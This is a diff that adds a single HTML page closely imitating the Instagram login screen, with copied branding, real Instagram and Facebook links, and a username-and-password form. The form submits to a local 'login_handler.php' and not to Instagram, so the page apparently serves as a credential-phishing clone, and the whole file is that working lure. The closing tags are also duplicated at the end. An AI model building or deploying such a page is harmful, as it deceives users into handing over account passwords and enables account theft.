@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="shortcut icon" href="/images/Instagram_logo.svg" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            flex-direction: column;
+            padding: 2px;
+        }
+        #lang{
+            border: none;
+            background-color: #ffffff;
+        }
+
+
+
+        .login-container {
+
+            text-align: center;
+            width: 320px;
+        }
+
+        .login-box {
+            background: #fff;
+            padding: 40px 20px;
+            border: 1px solid #d1c9c9;
+
+            margin-bottom: 10px;
+
+        }
+
+        h1 {
+            font-family: 'Billabong', sans-serif;
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 95%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 0px;
+            background-color: #fafafa;
+            outline-color: #6b0000;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+            margin: 0 10px;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: dodgerblue;
+            font-weight: bold;
+            margin: 15px;
+            text-decoration: none;
+        }
+
+        .facebook-login::before {
+            content: "";
+            background: url("/images/Instagram_logo.svg");
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+        }
+
+        /* Hover effect */
+        .facebook-login:hover {
+            color: #1d72b8;
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            margin-top: 10px;
+            color: rgb(18, 81, 145);
+            text-decoration: none;
+        }
+
+        .signup-box {
+            background: #ffffff;
+            padding: 15px;
+            border: 1px solid #dbdbdb;
+          
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: dodgerblue;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .app-links {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .store-buttons img {
+            width: 10px;
+          
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #8e8e8e;
+            margin: 0 5px;
+            text-decoration: none;
+        }
+
+
+
+        .logo {
+            width: 250px;
+
+        }
+    </style>
+</head>
+
+<body>
+
+    <select name="lang" id="lang">
+        <option value="English">English</option>
+        <option value="Hindi">Hindi</option>
+    </select>
+    <div class="login-container">
+    
+
+        <div class="login-box">
+            <h1 style="visibility: hidden;display: none;">Instagram</h1>
+            <img src="/images/p.png" class="logo" srcset="">
+
+            <form action="login_handler.php" method="POST">
+
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log in</button>
+                <div class="separator">OR</div>
+                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATBdYS6cbXNqWd_1Etygby5-cvZUZPXeipAZOCRQRd_PtWKHkQTKAIhGHFlBcX-w4Q9TDOcP5XRA_doEX3rheOCnULO01a7Uk0VrJvVZe9jGl4jzEO7wKLJNMpYWRrch0-nRRFsrXIuQGXmJjMGDZhZxoa_jB1eOXWdyxewmVL1L5sHPhQSdjeMkLnh2K2qG5NHRvbPNLrKJc4zw21HnhYBMwrY-qJzYgAOaOcjBHy9tp2VXkf2vWQmuDlMs714fin1a"
+                    class="facebook-login">Log in with Facebook</a>
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot
+                    password?</a>
+            </form>
+        </div>
+        <div class="signup-box">
+            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+        </div>
+        <div class="app-links">
+            Get the app. <br>
+            <img src="/images/12.png" class="logo " alt="" srcset="">
+            <!-- <div class="store-buttons">
+                    <img src="appstore.png" alt="App Store">
+                    <img src="playstore.png" alt="Google Play">
+                </div> -->
+        </div>
+    </div>
+    <div class="footer">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+        <br>
+        English © 2025 Instagram from Meta
+    </div>
+</body>
+
+</html>
+
+</body>
+
+</html>
